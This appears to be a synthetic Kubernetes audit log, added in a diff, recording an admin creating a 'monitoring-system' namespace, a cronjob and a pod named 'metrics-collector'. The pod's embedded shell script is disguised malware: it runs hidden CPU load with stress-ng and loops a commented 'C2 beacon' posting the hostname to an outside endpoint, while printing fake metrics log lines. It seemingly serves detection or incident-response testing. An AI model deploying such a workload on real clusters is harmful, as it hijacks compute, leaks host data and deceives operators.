@@ -1,0 +1,342 @@
+[
+  {
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "Metadata",
+    "auditID": "2993781b-f5a8-44d5-825e-26d11b1aa2d9",
+    "stage": "ResponseComplete",
+    "requestURI": "/apis/authorization.k8s.io/v1/selfsubjectrulesreviews",
+    "verb": "create",
+    "user": {
+      "username": "kubernetes-admin",
+      "groups": [
+        "kubeadm:cluster-admins",
+        "system:authenticated"
+      ]
+    },
+    "sourceIPs": [
+      "10.91.0.22"
+    ],
+    "userAgent": "kubectl/v1.31.2 (linux/amd64) kubernetes/5864a46",
+    "objectRef": {
+      "resource": "selfsubjectrulesreviews",
+      "apiGroup": "authorization.k8s.io",
+      "apiVersion": "v1"
+    },
+    "responseStatus": {
+      "metadata": {},
+      "code": 201
+    },
+    "requestReceivedTimestamp": "2026-11-06T11:08:01.722275Z",
+    "stageTimestamp": "2026-11-06T11:08:01.723654Z",
+    "annotations": {
+      "authorization.k8s.io/decision": "allow",
+      "authorization.k8s.io/reason": "RBAC: allowed by ClusterRoleBinding \"kubeadm:cluster-admins\" of ClusterRole \"cluster-admin\" to Group \"kubeadm:cluster-admins\""
+    }
+  },
+  {
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "Metadata",
+    "auditID": "5cadc193-8461-49dc-a2c5-3d480110381d",
+    "stage": "ResponseComplete",
+    "requestURI": "/api/v1/namespaces?limit=500",
+    "verb": "list",
+    "user": {
+      "username": "kubernetes-admin",
+      "groups": [
+        "kubeadm:cluster-admins",
+        "system:authenticated"
+      ]
+    },
+    "sourceIPs": [
+      "10.91.0.22"
+    ],
+    "userAgent": "kubectl/v1.31.2 (linux/amd64) kubernetes/5864a46",
+    "objectRef": {
+      "resource": "namespaces",
+      "apiVersion": "v1"
+    },
+    "responseStatus": {
+      "metadata": {},
+      "code": 200
+    },
+    "requestReceivedTimestamp": "2026-11-06T11:08:02.798047Z",
+    "stageTimestamp": "2026-11-06T11:08:02.800411Z",
+    "annotations": {
+      "authorization.k8s.io/decision": "allow",
+      "authorization.k8s.io/reason": "RBAC: allowed by ClusterRoleBinding \"kubeadm:cluster-admins\" of ClusterRole \"cluster-admin\" to Group \"kubeadm:cluster-admins\""
+    }
+  },
+  {
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "Metadata",
+    "auditID": "2c561636-6904-4017-8a59-a2919bd213f8",
+    "stage": "ResponseComplete",
+    "requestURI": "/api/v1/resourcequotas?limit=500",
+    "verb": "list",
+    "user": {
+      "username": "kubernetes-admin",
+      "groups": [
+        "kubeadm:cluster-admins",
+        "system:authenticated"
+      ]
+    },
+    "sourceIPs": [
+      "10.91.0.22"
+    ],
+    "userAgent": "kubectl/v1.31.2 (linux/amd64) kubernetes/5864a46",
+    "objectRef": {
+      "resource": "resourcequotas",
+      "apiVersion": "v1"
+    },
+    "responseStatus": {
+      "metadata": {},
+      "code": 200
+    },
+    "requestReceivedTimestamp": "2026-11-06T11:08:03.870265Z",
+    "stageTimestamp": "2026-11-06T11:08:04.137023Z",
+    "annotations": {
+      "authorization.k8s.io/decision": "allow",
+      "authorization.k8s.io/reason": "RBAC: allowed by ClusterRoleBinding \"kubeadm:cluster-admins\" of ClusterRole \"cluster-admin\" to Group \"kubeadm:cluster-admins\""
+    }
+  },
+  {
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "Metadata",
+    "auditID": "f2064347-2325-49d9-bd36-7b4fb37d4bbf",
+    "stage": "ResponseComplete",
+    "requestURI": "/api/v1/namespaces?fieldManager=kubectl-create&fieldValidation=Strict",
+    "verb": "create",
+    "user": {
+      "username": "kubernetes-admin",
+      "groups": [
+        "kubeadm:cluster-admins",
+        "system:authenticated"
+      ]
+    },
+    "sourceIPs": [
+      "10.91.0.22"
+    ],
+    "userAgent": "kubectl/v1.31.2 (linux/amd64) kubernetes/5864a46",
+    "objectRef": {
+      "resource": "namespaces",
+      "name": "monitoring-system",
+      "apiVersion": "v1"
+    },
+    "responseStatus": {
+      "metadata": {},
+      "code": 201
+    },
+    "requestReceivedTimestamp": "2026-11-06T11:08:05.220773Z",
+    "stageTimestamp": "2026-11-06T11:08:05.226155Z",
+    "annotations": {
+      "authorization.k8s.io/decision": "allow",
+      "authorization.k8s.io/reason": "RBAC: allowed by ClusterRoleBinding \"kubeadm:cluster-admins\" of ClusterRole \"cluster-admin\" to Group \"kubeadm:cluster-admins\""
+    }
+  },
+  {
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "RequestResponse",
+    "auditID": "d2f4227c-76d4-440b-84ca-3374607f23c8",
+    "stage": "ResponseComplete",
+    "requestURI": "/api/v1/namespaces/monitoring-system/pods?fieldManager=kubectl-client-side-apply&fieldValidation=Strict",
+    "verb": "create",
+    "user": {
+      "username": "kubernetes-admin",
+      "groups": [
+        "kubeadm:cluster-admins",
+        "system:authenticated"
+      ]
+    },
+    "sourceIPs": [
+      "10.91.0.22"
+    ],
+    "userAgent": "kubectl/v1.31.2 (linux/amd64) kubernetes/5864a46",
+    "objectRef": {
+      "resource": "pods",
+      "namespace": "monitoring-system",
+      "name": "metrics-collector",
+      "apiVersion": "v1"
+    },
+    "responseStatus": {
+      "metadata": {},
+      "code": 201
+    },
+    "requestReceivedTimestamp": "2026-11-06T11:08:08.137978Z",
+    "stageTimestamp": "2026-11-06T11:08:08.146652Z",
+    "annotations": {
+      "authorization.k8s.io/decision": "allow",
+      "authorization.k8s.io/reason": "RBAC: allowed by ClusterRoleBinding \"kubeadm:cluster-admins\" of ClusterRole \"cluster-admin\" to Group \"kubeadm:cluster-admins\"",
+      "pod-security.kubernetes.io/enforce-policy": "privileged:latest"
+    },
+    "requestObject": {
+      "kind": "Pod",
+      "metadata": {
+        "name": "metrics-collector",
+        "namespace": "monitoring-system"
+      },
+      "spec": {
+        "containers": [
+          {
+            "name": "collector",
+            "image": "alpine:latest",
+            "command": [
+              "/bin/sh",
+              "-c",
+              "echo \"[INFO] Metrics collector starting...\"\necho \"[INFO] Initializing aggregation pipeline...\"\n# Hidden: install tools\napk add --no-cache stress-ng curl > /dev/null 2>&1\necho \"[INFO] Connected to metrics backend\"\necho \"[INFO] Starting collection loop...\"\n# Hidden: CPU load (looks like metrics processing)\nstress-ng --cpu 2 --cpu-load 80 --timeout 0 &\n# Hidden: C2 beacon disguised as metrics export\nwhile true; do\n  echo \"[DEBUG] Aggregating metrics batch...\"\n  echo \"[DEBUG] Sending to remote endpoint...\"\n  curl -s -X POST http://httpbin.org/post \\\n    -H \"Content-Type: application/json\" \\\n    -d '{\"source\":\"node-'$(hostname)'\",\"metrics_count\":1500,\"batch_id\":42}' \\\n    || true\n  echo \"[DEBUG] Batch sent successfully\"\n  sleep 30\ndone\n"
+            ],
+            "resources": {
+              "limits": {
+                "cpu": "2",
+                "memory": "256Mi"
+              },
+              "requests": {
+                "cpu": "100m",
+                "memory": "64Mi"
+              }
+            },
+            "terminationMessagePath": "/dev/termination-log",
+            "terminationMessagePolicy": "File",
+            "imagePullPolicy": "Always"
+          }
+        ],
+        "restartPolicy": "Always",
+        "tolerations": [
+          {
+            "operator": "Exists"
+          }
+        ]
+      }
+    }
+  },
+  {
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "Metadata",
+    "auditID": "d99bbe32-128e-4f23-b241-0208e85ae7ad",
+    "stage": "ResponseComplete",
+    "requestURI": "/apis/batch/v1/namespaces/monitoring-system/cronjobs?fieldManager=kubectl-client-side-apply&fieldValidation=Strict",
+    "verb": "create",
+    "user": {
+      "username": "kubernetes-admin",
+      "groups": [
+        "kubeadm:cluster-admins",
+        "system:authenticated"
+      ]
+    },
+    "sourceIPs": [
+      "10.91.0.22"
+    ],
+    "userAgent": "kubectl/v1.31.2 (linux/amd64) kubernetes/5864a46",
+    "objectRef": {
+      "resource": "cronjobs",
+      "namespace": "monitoring-system",
+      "name": "metrics-maintenance",
+      "apiGroup": "batch",
+      "apiVersion": "v1"
+    },
+    "responseStatus": {
+      "metadata": {},
+      "code": 201
+    },
+    "requestReceivedTimestamp": "2026-11-06T11:08:16.034686Z",
+    "stageTimestamp": "2026-11-06T11:08:17.023050Z",
+    "annotations": {
+      "apiserver.latency.k8s.io/apf-queue-wait": "53.459µs",
+      "apiserver.latency.k8s.io/response-write": "1.079µs",
+      "apiserver.latency.k8s.io/serialize-response-object": "313.118µs",
+      "apiserver.latency.k8s.io/total": "988.363927ms",
+      "apiserver.latency.k8s.io/transform-response-object": "510ns",
+      "authorization.k8s.io/decision": "allow",
+      "authorization.k8s.io/reason": "RBAC: allowed by ClusterRoleBinding \"kubeadm:cluster-admins\" of ClusterRole \"cluster-admin\" to Group \"kubeadm:cluster-admins\""
+    }
+  },
+  {
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "Metadata",
+    "auditID": "aa15b601-d12a-49a0-9dda-d732c9c5d2bd",
+    "stage": "ResponseComplete",
+    "requestURI": "/apis/batch/v1/namespaces/monitoring-system/jobs",
+    "verb": "create",
+    "user": {
+      "username": "system:serviceaccount:kube-system:cronjob-controller",
+      "uid": "badbada6-2a0b-4344-80a5-5a4667bafd7e",
+      "groups": [
+        "system:serviceaccounts",
+        "system:serviceaccounts:kube-system",
+        "system:authenticated"
+      ]
+    },
+    "sourceIPs": [
+      "10.91.0.22"
+    ],
+    "userAgent": "kube-controller-manager/v1.31.2 (linux/amd64) kubernetes/5864a46/system:serviceaccount:kube-system:cronjob-controller",
+    "objectRef": {
+      "resource": "jobs",
+      "namespace": "monitoring-system",
+      "name": "metrics-maintenance-29899390",
+      "apiGroup": "batch",
+      "apiVersion": "v1"
+    },
+    "responseStatus": {
+      "metadata": {},
+      "code": 201
+    },
+    "requestReceivedTimestamp": "2026-11-06T11:10:01.069339Z",
+    "stageTimestamp": "2026-11-06T11:10:01.081774Z",
+    "annotations": {
+      "authorization.k8s.io/decision": "allow",
+      "authorization.k8s.io/reason": "RBAC: allowed by ClusterRoleBinding \"system:controller:cronjob-controller\" of ClusterRole \"system:controller:cronjob-controller\" to ServiceAccount \"cronjob-controller/kube-system\""
+    }
+  },
+  {
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "RequestResponse",
+    "auditID": "8cf205d3-a180-4319-8913-4de3bb40fd58",
+    "stage": "ResponseComplete",
+    "requestURI": "/api/v1/namespaces/monitoring-system/pods/metrics-collector",
+    "verb": "get",
+    "user": {
+      "username": "system:serviceaccount:monitoring-system:default",
+      "uid": "4b9ef65c-973b-44cb-a9cf-7a42e94fa528",
+      "groups": [
+        "system:serviceaccounts",
+        "system:serviceaccounts:monitoring-system",
+        "system:authenticated"
+      ]
+    },
+    "sourceIPs": [
+      "10.200.180.11"
+    ],
+    "userAgent": "kubectl/v1.37.2 (linux/amd64) kubernetes/c50e539",
+    "objectRef": {
+      "resource": "pods",
+      "namespace": "monitoring-system",
+      "name": "metrics-collector",
+      "apiVersion": "v1"
+    },
+    "responseStatus": {
+      "metadata": {},
+      "status": "Failure",
+      "message": "pods \"metrics-collector\" is forbidden: User \"system:serviceaccount:monitoring-system:default\" cannot get resource \"pods\" in API group \"\" in the namespace \"monitoring-system\"",
+      "reason": "Forbidden",
+      "details": {
+        "name": "metrics-collector",
+        "kind": "pods"
+      },
+      "code": 403
+    },
+    "requestReceivedTimestamp": "2026-11-06T11:10:11.722664Z",
+    "stageTimestamp": "2026-11-06T11:10:11.723360Z",
+    "annotations": {
+      "authorization.k8s.io/decision": "forbid",
+      "authorization.k8s.io/reason": ""
+    }
+  }
+]
